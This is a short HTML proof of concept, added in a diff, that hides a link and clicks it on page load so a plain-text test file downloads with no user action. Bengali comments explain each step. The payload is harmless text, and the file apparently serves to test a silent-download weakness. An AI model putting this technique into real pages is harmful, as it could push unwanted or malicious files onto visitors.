@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Silent Download PoC</title>
+</head>
+<body>
+    <h1>Testing Silent Download Vulnerability...</h1>
+    <script>
+        // একটি ইনভিজিবল ফাইল তৈরি করা
+        const blob = new Blob(["This is a test malware/file content"], { type: 'text/plain' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        
+        a.style.display = 'none';
+        a.href = url;
+        a.download = 'test_file.txt'; // ফাইলের নাম
+        
+        document.body.appendChild(a);
+        
+        // কোনো ক্লিক ছাড়াই অটোমেটিক ডাউনলোড ট্রিগার করার চেষ্টা
+        window.onload = function() {
+            a.click(); 
+            window.URL.revokeObjectURL(url);
+            console.log("Download triggered automatically.");
+        };
+    </script>
+</body>
+</html>
